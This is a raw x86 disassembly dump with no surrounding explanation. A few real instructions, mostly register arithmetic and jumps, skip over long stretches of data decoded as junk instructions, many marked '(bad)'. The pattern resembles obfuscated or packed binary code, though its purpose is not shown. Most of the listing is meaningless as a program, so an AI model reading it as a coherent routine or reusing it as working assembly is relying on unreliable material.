  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    eax,FWORD PTR [esi]
  40d0ef:	lds    ebp,FWORD PTR [esi]
  40d0f1:	nop
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0e1
  40d0fb:	js     0x40d0e9
  40d0fd:	rcr    BYTE PTR [esi],1
  40d0ff:	iret   
  40d100:	or     BYTE PTR [ebp-0x42],ch
  40d103:	aam    0x45
  40d105:	jle    0x40d08f
  40d107:	dec    ebx
  40d108:	test   eax,0x6cd17f82
  40d10d:	stos   DWORD PTR es:[edi],eax
  40d10e:	loop   0x40d0e3
  40d110:	push   edi
  40d111:	xchg   ecx,esi
  40d113:	stos   BYTE PTR es:[edi],al
  40d114:	mov    ds:0xb0b50dd7,eax
  40d119:	iret   
  40d11a:	(bad)  
  40d11b:	xchg   edx,eax
  40d11c:	popf   
  40d11d:	sbb    DWORD PTR [ebx],edi
  40d11f:	enter  0xafe3,0x75
  40d123:	xchg   BYTE PTR [edi-0x2e1c4226],dl
  40d129:	mov    dh,0xf9
  40d12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d12c:	sub    BYTE PTR [ebp+0x2d],0x62
  40d130:	mov    DWORD PTR [eax+0x6f357b24],edx
  40d136:	inc    DWORD PTR ds:0x5dbed93f
  40d13c:	mov    dl,0xf7
  40d13e:	outs   dx,BYTE PTR ds:[esi]
  40d13f:	mov    esp,0x443a7ece
  40d144:	inc    ecx
  40d145:	leave  
  40d146:	adc    DWORD PTR ds:0x78dbc369,0x7c54e591
  40d150:	es jb  0x40d1c0
  40d153:	cmp    edx,DWORD PTR [esi+0x702c1ba3]
  40d159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d15a:	mov    al,ds:0x9119ce9f
  40d15f:	pop    esi
  40d160:	jp     0x40d1de
  40d162:	add    edi,eax
  40d164:	cs jl  0x40d18a
  40d167:	js     0x40d1e2
  40d169:	fstp   TBYTE PTR ds:0x1a601a51
  40d16f:	sub    bh,BYTE PTR [eax]
  40d171:	movsx  ebp,WORD PTR es:[ebx+ecx*1]
  40d176:	mov    eax,ds:0x147c6468
  40d17b:	sahf   
  40d17c:	cmp    esi,DWORD PTR [edx+0x46]
  40d17f:	idiv   BYTE PTR [ebp-0x9e37ec1]
  40d185:	sub    DWORD PTR [edx+0x6f],ecx
  40d188:	mov    ss,esp
  40d18a:	imul   ebx,ebp,0x61
  40d18d:	xor    ah,BYTE PTR [edx]
  40d18f:	pop    ecx
  40d190:	fs jl  0x40d179
  40d193:	xchg   BYTE PTR [edi+0x7b5226ba],cl
  40d199:	cmp    eax,0x697a626e
  40d19e:	test   edx,ebp
  40d1a0:	test   eax,0x7f541bc4
  40d1a5:	or     al,0x98
  40d1a7:	nop
  40d1a8:	mov    esi,ecx
  40d1aa:	jbe    0x40d195
  40d1ac:	jp     0x40d1ee
  40d1ae:	mov    bl,0x17
  40d1b0:	mov    eax,0xe730659f
  40d1b5:	enter  0xfc97,0x51
  40d1b9:	mov    DWORD PTR [esi-0x9],edi
  40d1bc:	lock pop eax
  40d1be:	std    
  40d1bf:	cwde   
  40d1c0:	loopne 0x40d1b3
  40d1c2:	test   DWORD PTR [edx-0x68],edi
  40d1c5:	jb     0x40d14e
  40d1c7:	pop    edx
  40d1c8:	mov    BYTE PTR [esp+eax*8-0xab3a749],bl
  40d1cf:	rcl    DWORD PTR [ecx+0x2aa4da1c],cl
  40d1d5:	sbb    DWORD PTR [edx+0x3a5a9284],edx
  40d1db:	mov    edx,0x7c0c46fb
  40d1e0:	stos   DWORD PTR es:[edi],eax
  40d1e1:	lods   al,BYTE PTR ds:[esi]
  40d1e2:	push   ecx
  40d1e3:	xor    al,0xa2
  40d1e5:	cdq    
  40d1e6:	jne    0x40d181
  40d1e8:	add    eax,0x3fcf3398
  40d1ed:	cld    
  40d1ee:	adc    BYTE PTR [ebx-0x8eb4b0b],cl
  40d1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f5:	push   esp
  40d1f6:	inc    eax
  40d1f7:	std    
  40d1f8:	adc    bh,dl
  40d1fa:	dec    dx
  40d1fc:	add    edi,ebp
  40d1fe:	scas   al,BYTE PTR es:[edi]
  40d1ff:	fcom   QWORD PTR [eax*8-0x6e30a087]
  40d206:	dec    esp
  40d207:	xor    eax,ebp
  40d209:	hlt    
  40d20a:	mov    edi,0x970399d4
  40d20f:	pop    ss
  40d210:	es jg  0x40d1b2
  40d213:	lea    esi,ds:0x9b54b99c
  40d219:	fsubrp st(7),st
  40d21b:	mov    ah,0x69
  40d21d:	lds    esi,FWORD PTR [ebp+0x3]
  40d220:	jle    0x40d1b6
  40d222:	xor    al,0xcb
  40d224:	loop   0x40d1c6
  40d226:	cmc    
  40d227:	sub    al,0x35
  40d229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22a:	ret    
  40d22b:	fnsave [edx-0x35e1a43e]
  40d231:	mov    bl,0x48
  40d233:	leave  
  40d234:	push   es
  40d235:	or     eax,0x570735f1
  40d23a:	cli    
  40d23b:	xor    ebx,DWORD PTR [edi+eiz*1+0x6a]
  40d23f:	fisttp DWORD PTR [ebp+ebp*8-0x4aa2d0b5]
  40d246:	test   bh,dl
  40d248:	cwde   
  40d249:	loopne 0x40d1d6
  40d24b:	repz ret 
  40d24d:	xor    bh,BYTE PTR [ecx]
  40d24f:	mov    ebp,0xb5452c54
  40d254:	call   0x69d9a5a2
  40d259:	loopne 0x40d1e3
  40d25b:	in     al,0xf1
  40d25d:	int    0xf6
  40d25f:	pop    ebp
  40d260:	dec    edi
  40d261:	les    ecx,FWORD PTR [eax+0x3ae00bdf]
  40d267:	sbb    eax,0xe24c2f00
  40d26c:	ret    
  40d26d:	or     BYTE PTR [eax],al
  40d26f:	xor    BYTE PTR [edx],ch
  40d271:	in     al,0x4
  40d273:	fidiv  WORD PTR [edx+0x61b07bf8]
  40d279:	inc    esp
  40d27a:	inc    ebp
  40d27b:	rol    DWORD PTR [edi+0x38727c52],0xa8
  40d282:	neg    DWORD PTR [esi-0x6c3c56a8]
  40d288:	jge    0x40d28b
  40d28a:	or     ah,BYTE PTR [eax]
  40d28c:	fld    st(0)
  40d28e:	pop    esp
  40d28f:	mov    dl,0xef
  40d291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d292:	mov    ds:0x9b8c1a03,eax
  40d297:	leave  
  40d298:	mov    ds:0x7a68dcde,eax
  40d29d:	imul   edx,DWORD PTR [ebx],0xffffff83
  40d2a0:	in     al,dx
  40d2a1:	cs mov cl,0x8c
  40d2a4:	xor    cl,BYTE PTR [ecx]
  40d2a6:	mov    WORD PTR [eax+0x0],cs
  40d2a9:	cld    
  40d2aa:	sbb    DWORD PTR [esi],edi
  40d2ac:	je     0x40d31f
  40d2ae:	lods   al,BYTE PTR ds:[esi]
  40d2af:	dec    esi
  40d2b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2b1:	loop   0x40d329
  40d2b3:	sbb    eax,0x46fec8e1
  40d2b8:	cmp    al,0x9f
  40d2ba:	push   0xa4e07b5d
  40d2bf:	fwait
  40d2c0:	xchg   ebx,eax
  40d2c1:	adc    edx,DWORD PTR [edx]
  40d2c3:	ins    BYTE PTR es:[edi],dx
  40d2c4:	and    eax,0xf9e8e468
  40d2c9:	cli    
  40d2ca:	(bad)  
  40d2cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2cc:	aaa    
  40d2cd:	jmp    0x8c91:0x50b6157d
  40d2d4:	or     edx,esp
  40d2d6:	pop    es
  40d2d7:	scas   al,BYTE PTR es:[edi]
  40d2d8:	jns    0x40d2e6
  40d2da:	xlat   BYTE PTR ds:[ebx]
  40d2db:	mov    bh,0xcc
  40d2dd:	jne    0x40d287
  40d2df:	sbb    al,dl
  40d2e1:	and    eax,0xe8d1e97a
  40d2e6:	jns    0x40d2c8
  40d2e8:	jae    0x40d2bb
  40d2ea:	lods   eax,DWORD PTR ds:[esi]
  40d2eb:	cli    
  40d2ec:	sub    eax,0xeef13863
  40d2f1:	es sti 
  40d2f3:	adc    edi,ecx
  40d2f5:	sar    DWORD PTR [ecx*1-0x35998537],1
  40d2fc:	loope  0x40d2df
  40d2fe:	pop    ss
  40d2ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d300:	mov    esp,0x44c7681c
  40d305:	shl    DWORD PTR [ecx],0x60
  40d308:	icebp  
  40d309:	sbb    al,0xe0
  40d30b:	iret   
  40d30c:	mov    dh,0x91
  40d30e:	cld    
  40d30f:	cmp    edi,DWORD PTR [eax]
  40d311:	jecxz  0x40d380
  40d313:	dec    edi
  40d314:	mov    eax,0xb31b0513
  40d319:	sub    BYTE PTR [eax+0x2e],cl
  40d31c:	fsub   QWORD PTR [eax-0x24d4851b]
  40d322:	scas   al,BYTE PTR es:[edi]
  40d323:	jnp    0x40d2ae
  40d325:	add    BYTE PTR [eax+ebx*4+0x3243bac6],0x88
  40d32d:	sbb    eax,0x8c3c5a22
  40d332:	js     0x40d3a3
  40d334:	add    BYTE PTR [ebx],ch
  40d336:	adc    BYTE PTR [edi+0x21bc0371],dh
  40d33c:	aam    0xbc
  40d33e:	push   ecx
  40d33f:	push   0x65f7420a
  40d344:	loop   0x40d33c
  40d346:	sti    
  40d347:	cmp    esp,DWORD PTR [edi]
  40d349:	test   esp,edx
  40d34b:	cmovge edi,DWORD PTR es:[ebx]
  40d34f:	(bad)  
  40d350:	adc    eax,0xbe8ff6e5
  40d355:	and    al,0x58
  40d357:	retf   
  40d358:	mov    WORD PTR [edx-0x26595ef1],?
  40d35e:	enter  0xbe01,0x10
  40d362:	xor    edx,ebp
  40d364:	lock adc esi,eax
  40d367:	pop    ss
  40d368:	jne    0x40d349
  40d36a:	pop    edi
  40d36b:	cwde   
  40d36c:	and    DWORD PTR [edx-0x7a],ebp
  40d36f:	push   ebx
  40d370:	pop    ebx
  40d371:	xchg   ebx,eax
  40d372:	sbb    BYTE PTR [ebp+0x5dd08d23],cl
  40d378:	cmp    eax,0x1ce0a1ce
  40d37d:	mov    dl,0xc7
  40d37f:	lea    edi,[eax]
  40d381:	mov    bh,BYTE PTR [esi-0x78]
  40d384:	xor    ah,BYTE PTR [ecx+0x1a546012]
  40d38a:	cmp    DWORD PTR [ecx+0x55],ebx
  40d38d:	fsubr  QWORD PTR [eax+0x24]
  40d390:	das    
  40d391:	xchg   esi,eax
  40d392:	mov    ebx,0x3d4e2ea8
  40d397:	cmp    dl,BYTE PTR [ebx+edi*8-0x5504c49a]
  40d39e:	jg     0x40d3b0
  40d3a0:	imul   edx,DWORD PTR [eax+0xe9d541d],0x3c
  40d3a7:	call   edx
  40d3a9:	mov    ebp,0x5527c87d
  40d3ae:	pushf  
  40d3af:	adc    cl,ah
  40d3b1:	sbb    BYTE PTR [esi],dl
  40d3b3:	ds mov dh,0xa1
  40d3b6:	test   eax,0xf957ade5
  40d3bb:	out    dx,al
  40d3bc:	rcr    BYTE PTR [edx-0x6b],cl
  40d3bf:	stos   BYTE PTR es:[edi],al
  40d3c0:	cmp    ecx,esi
  40d3c2:	pop    ebp
  40d3c3:	jo     0x40d3ff
  40d3c5:	sub    BYTE PTR [eax],ch
  40d3c7:	add    eax,0xd8bb2341
  40d3cc:	xchg   ebx,eax
  40d3cd:	and    al,0xc0
  40d3cf:	mov    ecx,DWORD PTR [eax*1-0x7a158834]
  40d3d6:	outs   dx,BYTE PTR ds:[esi]
  40d3d7:	mov    al,ds:0x42cf8782
  40d3dc:	lods   al,BYTE PTR ds:[esi]
  40d3dd:	dec    edx
  40d3de:	jmp    0xac9f:0x6240939f
  40d3e5:	mov    esp,0x9e41fa08
  40d3ea:	rcl    BYTE PTR [edi],cl
  40d3ec:	push   esi
  40d3ed:	call   0x9860:0xdf186609
  40d3f4:	cmp    al,0xd6
  40d3f6:	pop    ss
  40d3f7:	mov    cl,0xbf
  40d3f9:	mov    eax,ds:0xe8d80a9f
  40d3fe:	idiv   DWORD PTR [eax+0xb5413c2]
  40d404:	repnz mov dl,0xe5
  40d407:	mov    edx,0x12098c73
  40d40c:	jo     0x40d3a4
  40d40e:	dec    esi
  40d40f:	push   edi
  40d410:	sub    edx,DWORD PTR [esi+ebx*1-0x4e5d6795]
  40d417:	and    ah,bh
  40d419:	imul   ebx,DWORD PTR [edx],0xffffffe3
  40d41c:	xchg   esi,eax
  40d41d:	sbb    al,0xd
  40d41f:	dec    ebp
  40d420:	imul   edi,DWORD PTR [eax],0x30
  40d423:	iret   
  40d424:	push   0x73616fb6
  40d429:	sub    bh,cl
  40d42b:	pextrw ebp,mm3,0x86
  40d42f:	dec    edi
  40d430:	cmp    dl,BYTE PTR [edi+0x7d]
  40d433:	inc    ebx
  40d434:	outs   dx,DWORD PTR ds:[esi]
  40d435:	pop    esp
  40d436:	and    al,BYTE PTR [ebx]
  40d438:	xor    ah,dh
  40d43a:	das    
  40d43b:	sbb    al,0x64
  40d43d:	add    BYTE PTR [esi+0x3e6cd5ed],cl
  40d443:	icebp  
  40d444:	xbegin 0xc0a4603a
  40d44a:	stos   BYTE PTR es:[edi],al
  40d44b:	adc    eax,esp
  40d44d:	scas   eax,DWORD PTR es:[edi]
  40d44e:	add    edx,DWORD PTR [eax+ebp*8-0x19]
  40d452:	out    dx,al
  40d453:	nop
  40d454:	cmp    eax,0xbd7a55c3
  40d459:	jle    0x40d40d
  40d45b:	(bad)  
  40d45d:	inc    ecx
  40d45e:	mov    bl,0xc9
  40d460:	and    BYTE PTR [bx+di+0x3f],bl
  40d464:	mov    ?,WORD PTR [ecx]
  40d466:	mov    dx,0xfa6c
  40d46a:	push   ebp
  40d46b:	fadd   QWORD PTR [edx-0x40]
  40d46e:	mov    ecx,gs
  40d470:	push   edi
  40d471:	xor    DWORD PTR [edi],edx
  40d473:	push   edi
  40d474:	aam    0x78
  40d476:	cmc    
  40d477:	push   esi
  40d478:	ficomp WORD PTR [edx+eiz*1]
  40d47b:	mov    ch,0x6e
  40d47d:	les    ebx,FWORD PTR [edx+0x614fe6e]
  40d483:	ja     0x40d486
  40d485:	jge    0x40d48c
  40d487:	cld    
  40d488:	or     DWORD PTR [eax-0x5056caf2],ebx
  40d48e:	or     ah,BYTE PTR [edx+0x5317f611]
  40d494:	mov    cl,0x80
  40d496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d497:	stos   BYTE PTR es:[edi],al
  40d498:	mov    dh,0xff
  40d49a:	push   ss
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x89d3:0xb81a1d63
  40d4c6:	std    
  40d4c7:	cmp    DWORD PTR [ecx-0x37],edx
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4fd
  40d4d2:	jmp    0x3276ba5a
  40d4d7:	repnz xor esi,esi
  40d4da:	leave  
  40d4db:	cmp    DWORD PTR [ebx+0x43],0x5b
  40d4df:	mov    ecx,edi
  40d4e1:	mov    esi,0x12141faf
  40d4e6:	dec    ecx
  40d4e7:	scas   al,BYTE PTR es:[di]
  40d4e9:	sub    al,0xd8
  40d4eb:	pop    ebp
  40d4ec:	mov    dh,0xe
  40d4ee:	or     eax,0x8ee898e2
  40d4f3:	jno    0x40d4db
  40d4f5:	dec    esi
  40d4f6:	push   edx
  40d4f7:	imul   esi,esi,0x20
  40d4fa:	push   esp
  40d4fb:	xor    DWORD PTR [ebx],esi
  40d4fd:	mov    ds:0x4b35ab1,al
  40d502:	fsub   DWORD PTR [ebp+0x15e30c88]
  40d508:	and    eax,0x415259bb
  40d50d:	ja     0x40d4ca
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jp     0x40d56e
  40d512:	mov    al,ds:0x26ef4feb
  40d517:	mov    esp,0x79ca58d0
  40d51c:	or     eax,0x159bc91b
  40d521:	adc    edx,esp
  40d523:	in     al,dx
  40d524:	push   0xe629e8ee
  40d529:	pop    ebp
  40d52a:	mov    eax,ds:0x118c5247
  40d52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d530:	xchg   esi,eax
  40d531:	popa   
  40d532:	imul   ebx,DWORD PTR [eax-0x7afa62af],0xdde695c0
  40d53c:	cmp    cl,BYTE PTR [ebx]
  40d53e:	adc    BYTE PTR [ebx],ch
  40d540:	add    dh,ch
  40d542:	dec    esi
  40d543:	mov    esi,DWORD PTR [ebp-0x5c]
  40d546:	push   ebx
  40d547:	repz idiv dl
  40d54a:	jge    0x40d57b
  40d54c:	dec    ecx
  40d54d:	xchg   BYTE PTR [ebp-0x8],cl
  40d550:	and    cl,dh
  40d552:	or     ch,BYTE PTR [eax]
  40d554:	fnstcw WORD PTR [edx+0x7b12961a]
  40d55a:	aas    
  40d55b:	in     eax,0x21
  40d55d:	adc    DWORD PTR [ebx+0x60fac62e],ecx
  40d563:	adc    esi,ebx
  40d565:	shl    DWORD PTR [edi],0x8
  40d568:	dec    ecx
  40d569:	jmp    0x1709:0x2dec68ea
  40d570:	loope  0x40d5d0
  40d572:	or     DWORD PTR [esi+ecx*8-0x4aa6636],eax
  40d579:	test   al,0xa0
  40d57b:	cmp    DWORD PTR [ebx-0x1b14711f],eax
  40d581:	test   BYTE PTR [ebp+0x7f],cl
  40d584:	jb     0x40d525
  40d586:	fst    QWORD PTR [ecx-0x63]
  40d589:	cmp    esi,DWORD PTR [esi-0x51]
  40d58c:	lea    ebp,[ebx+0x6]
  40d58f:	sub    al,0xa5
  40d591:	imul   ebx,DWORD PTR [ebp+0x6502faef],0xffffff85
  40d598:	push   esi
  40d599:	adc    edx,DWORD PTR [esi+0x41]
  40d59c:	mov    al,ds:0x2f9b59e2
  40d5a1:	push   ecx
  40d5a2:	add    BYTE PTR [ebx+edi*8-0x77],bh
  40d5a6:	retf   0x59eb
  40d5a9:	sub    esp,DWORD PTR [ebp+eax*1-0x250fa4d3]
  40d5b0:	sub    BYTE PTR cs:[ecx+0x145a0d3f],dh
  40d5b7:	cmp    al,0x1a
  40d5b9:	mov    ds:0x17ad106f,eax
  40d5be:	shr    DWORD PTR [ebx+0x6d],0x8d
  40d5c2:	jae    0x40d630
  40d5c4:	call   0xe29079d0
  40d5c9:	enter  0xc77c,0xb
  40d5cd:	push   esp
  40d5ce:	ficom  DWORD PTR [ebp+0x5f05cf71]
  40d5d4:	(bad)  
  40d5d5:	push   0x4ea060c4
  40d5da:	fcomp  st(5)
  40d5dc:	add    al,0x31
  40d5de:	dec    edx
  40d5df:	adc    BYTE PTR [ebp-0x4d1cc9ea],dh
  40d5e5:	sbb    BYTE PTR [eax+ecx*4-0x5ea9bfb],ah
  40d5ec:	push   ebp
  40d5ed:	cmp    al,0x15
  40d5ef:	and    eax,0x8728579c
  40d5f4:	cmp    BYTE PTR [edx],bl
  40d5f6:	rcr    ah,0xae
  40d5f9:	xor    ecx,DWORD PTR [eax-0x2e]
  40d5fc:	lock std 
  40d5fe:	nop
  40d5ff:	jg     0x40d67d
  40d601:	mov    fs,WORD PTR [ebx*8+0x92c69]
  40d608:	ss call 0x1332378
  40d60e:	enter  0x8831,0x6b
  40d612:	cmp    DWORD PTR [ecx],0xffffffc1
  40d615:	scas   al,BYTE PTR es:[edi]
  40d616:	xor    al,0xe2
  40d618:	or     ebp,DWORD PTR [edx+0x68]
  40d61b:	mov    eax,0x7f512f73
  40d620:	adc    eax,0x5b8b6292
  40d625:	inc    esi
  40d626:	aaa    
  40d627:	nop
  40d628:	adc    dl,BYTE PTR [edx-0x7f99daba]
  40d62e:	call   DWORD PTR [ebx]
  40d630:	adc    dh,BYTE PTR [esi]
  40d632:	gs or  al,0x23
  40d635:	pop    edx
  40d636:	xor    al,0xf8
  40d638:	ret    0x5976
  40d63b:	pop    ss
  40d63c:	xor    BYTE PTR [ecx],dl
  40d63e:	pop    ecx
  40d63f:	imul   edi,DWORD PTR [ebx-0x4b623790],0xffffffce
  40d646:	sub    eax,0x56384b92
  40d64b:	add    al,0x1d
  40d64d:	mov    al,ds:0x7a37f526
  40d652:	dec    edi
  40d653:	or     al,0xd3
  40d656:	dec    ebp
  40d657:	dec    ebp
  40d658:	sbb    al,0x7d
  40d65a:	(bad)  
  40d65b:	das    
  40d65c:	lods   al,BYTE PTR ds:[esi]
  40d65d:	mov    ds:0xd3cf44d8,eax
  40d662:	ds jbe 0x40d6e1
  40d665:	push   0x1d5c0d11
  40d66a:	mov    bl,0x45
  40d66c:	adc    BYTE PTR [edx-0x7a],bl
  40d66f:	mov    BYTE PTR [ebx-0x41],dh
  40d672:	pop    ebx
  40d673:	or     DWORD PTR ds:0x220b323c,edi
  40d679:	jl     0x40d673
  40d67b:	mov    bh,0x49
  40d67d:	mov    esi,0xd1936a9
  40d682:	push   ss
  40d683:	(bad)  
  40d685:	pop    esp
  40d686:	or     al,0x13
  40d688:	sahf   
  40d689:	inc    edi
  40d68a:	test   DWORD PTR [esi-0x6591f9aa],edx
  40d690:	add    eax,0xaa6b8836
  40d695:	in     al,0x8a
  40d697:	mov    al,0x39
  40d699:	pusha  
  40d69a:	es xchg ebx,eax
  40d69c:	mov    al,0xab
  40d69e:	cli    
  40d69f:	in     eax,dx
  40d6a0:	jb     0x40d641
  40d6a2:	inc    ebp
  40d6a3:	pop    edi
  40d6a4:	or     BYTE PTR [ecx-0x3c],al
  40d6a7:	mov    esp,0xb0fb832d
  40d6ac:	lahf   
  40d6ad:	fs pop es
  40d6af:	adc    eax,0xb9fbcf08
  40d6b5:	gs icebp 
  40d6b7:	mov    ebx,0x7414ccd7
  40d6bc:	mov    eax,0x1426187d
  40d6c1:	adc    bh,BYTE PTR [eax]
  40d6c3:	pop    esp
  40d6c4:	stc    
  40d6c5:	rol    ch,1
  40d6c7:	dec    edx
  40d6c8:	xchg   ecx,eax
  40d6c9:	push   ss
  40d6ca:	cwde   
  40d6cb:	mov    ebp,0x82f08ee8
  40d6d0:	push   es
  40d6d1:	xor    ecx,DWORD PTR [ecx]
  40d6d3:	mov    cl,0x89
  40d6d5:	xchg   ebx,eax
  40d6d6:	push   esp
  40d6d7:	push   edx
  40d6d8:	jle    0x40d6cb
  40d6da:	cmp    bh,BYTE PTR [ecx+0x7add5d09]
  40d6e0:	jp     0x40d672
  40d6e2:	sbb    ebx,eax
  40d6e4:	jns    0x40d705
  40d6e6:	loop   0x40d6d7
  40d6e8:	inc    ebx
  40d6e9:	xor    DWORD PTR [ecx],0x15e9ec55
  40d6ef:	dec    ebp
  40d6f0:	call   0x5cc8:0x6ce6a800
  40d6f7:	ds xchg esp,eax
  40d6f9:	lock jg 0x40d76d
  40d6fc:	xor    al,0xb6
  40d6fe:	imul   edi,esp,0xffffffb9
  40d701:	mov    eax,0x7ce34099
  40d706:	aam    0xec
  40d708:	xchg   esi,eax
  40d709:	mov    ebx,0xd8faec4
  40d70e:	call   0x137e:0x3559ef1f
  40d715:	stos   DWORD PTR es:[edi],eax
  40d716:	mul    BYTE PTR [esi]
  40d718:	or     ah,0x2c
  40d71b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d71d:	out    dx,eax
  40d71e:	lods   al,BYTE PTR ds:[esi]
  40d71f:	vaddpd ymm4,ymm3,YMMWORD PTR [esi]
  40d723:	cmc    
  40d724:	jmp    0x9f1d:0x17395cb9
  40d72b:	repnz test eax,0x3a167ac8
  40d731:	stos   DWORD PTR es:[edi],eax
  40d732:	bound  edx,QWORD PTR [eax+eiz*4+0x4300be90]
  40d739:	jbe    0x40d6d0
  40d73b:	push   cs
  40d73c:	stos   DWORD PTR es:[edi],eax
  40d73d:	lahf   
  40d73e:	loop   0x40d7b9
  40d740:	mov    edx,0xc92de68b
  40d745:	rol    DWORD PTR [ecx+0x28536a3d],1
  40d74b:	fld    DWORD PTR [eax]
  40d74d:	rcpps  xmm0,XMMWORD PTR ds:0x81ef08b5
  40d754:	xchg   BYTE PTR [edi-0x29],cl
  40d757:	lahf   
  40d758:	(bad)  
  40d75b:	fnsave [ebp-0x36529e7d]
  40d761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d762:	mov    esi,?
  40d764:	(bad)  
  40d765:	dec    eax
  40d766:	arpl   WORD PTR [eax],si
  40d768:	lods   eax,DWORD PTR ds:[esi]
  40d769:	xor    cl,cl
  40d76b:	cwde   
  40d76c:	(bad)  
  40d76d:	lods   al,BYTE PTR ds:[esi]
  40d76e:	clc    
  40d76f:	cld    
  40d770:	les    edx,FWORD PTR [eax+eiz*4-0x198a9cba]
  40d777:	push   ecx
  40d778:	in     al,0x6c
  40d77a:	out    0x66,eax
  40d77c:	dec    edi
  40d77d:	out    0x16,eax
  40d77f:	sub    DWORD PTR [ecx],esi
  40d781:	cmp    al,0x22
  40d783:	jg     0x40d74f
  40d785:	push   ebx
  40d786:	inc    ebx
  40d787:	xchg   DWORD PTR cs:[edx+0x56],edi
  40d78b:	mov    bl,0xcb
  40d78d:	xchg   BYTE PTR [esi+eax*1],bl
  40d790:	sbb    DWORD PTR [ebx-0xc],eax
  40d793:	cmp    esi,DWORD PTR [esi]
  40d795:	jl     0x40d814
  40d797:	fdiv   DWORD PTR [esi-0x44]
  40d79a:	dec    DWORD PTR [edx]
  40d79c:	int    0xe7
  40d79e:	push   eax
  40d79f:	push   esi
  40d7a0:	add    DWORD PTR [edi+0x74],esi
  40d7a3:	rcl    BYTE PTR [ebp+0x17447989],cl
  40d7a9:	jbe    0x40d7e2
  40d7ab:	xchg   edi,eax
  40d7ac:	adc    BYTE PTR [edi+0x2],bh
  40d7af:	ins    BYTE PTR es:[edi],dx
  40d7b0:	ins    BYTE PTR es:[edi],dx
  40d7b1:	jp     0x40d770
  40d7b3:	mov    al,0xc0
  40d7b5:	(bad)  
  40d7b6:	adc    al,BYTE PTR [edi]
  40d7b8:	retf   0x1463
  40d7bb:	call   0x23ab:0xb4ba7dae
  40d7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c3:	jae    0x40d826
  40d7c5:	jno    0x40d7d8
  40d7c7:	addr16 xchg esi,eax
  40d7c9:	sbb    BYTE PTR [edi],bl
  40d7cb:	dec    edi
  40d7cc:	out    0x5,al
  40d7ce:	add    ah,BYTE PTR [eax+eax*2-0x14]
  40d7d2:	call   0x1366:0x3fad027f
  40d7d9:	sar    DWORD PTR [ebx+0x5931149e],cl
  40d7df:	or     bh,BYTE PTR cs:[esi]
  40d7e2:	inc    eax
  40d7e3:	sbb    edx,DWORD PTR [ebx+0x75]
  40d7e6:	pop    edi
  40d7e7:	aam    0xd0
  40d7e9:	and    BYTE PTR [esi+0x14],0x84
  40d7ed:	(bad)  
  40d7ee:	xor    eax,DWORD PTR [ebx-0x72]
  40d7f1:	inc    esp
  40d7f2:	mov    esp,0x6139c545
  40d7f7:	cmp    bl,BYTE PTR [eax]
  40d7f9:	data16 or bh,BYTE PTR fs:[ebx-0x30]
  40d7fe:	lods   al,BYTE PTR ds:[esi]
  40d7ff:	pop    ecx
  40d800:	bound  ecx,QWORD PTR [esi-0x7ac3938d]
  40d806:	sub    DWORD PTR [ecx-0x32],esp
  40d809:	cs sbb dh,ch
  40d80c:	in     eax,0xb
  40d80e:	shr    BYTE PTR [ebx],1
  40d810:	cdq    
  40d811:	fnstcw WORD PTR [eax+0x23f3748a]
  40d817:	mov    BYTE PTR [ecx+ecx*4],0xcc
  40d81b:	hlt    
  40d81c:	push   ds
  40d81d:	push   ecx
  40d81e:	mov    ecx,0x12ce9cea
  40d823:	mov    ch,0x44
  40d825:	es or  al,0xf4
  40d828:	lahf   
  40d829:	scas   al,BYTE PTR es:[edi]
  40d82a:	add    eax,0x4e433a3
  40d82f:	ja     0x40d7d2
  40d831:	rcl    dl,0xc4
  40d834:	out    dx,eax
  40d835:	dec    edx
  40d836:	pop    eax
  40d837:	leave  
  40d838:	ins    BYTE PTR es:[edi],dx
  40d839:	fwait
  40d83a:	bound  edx,QWORD PTR [ebp+0x61fedae8]
  40d840:	ins    BYTE PTR es:[edi],dx
  40d841:	nop
  40d842:	inc    edi
  40d843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d844:	dec    ecx
  40d845:	xor    DWORD PTR [ecx+0x8b8713d],edi
  40d84b:	mov    ah,0x7
  40d84d:	sbb    dh,ch
  40d84f:	gs sub eax,0xf85c08e1
  40d855:	cmp    ebp,edi
  40d857:	stc    
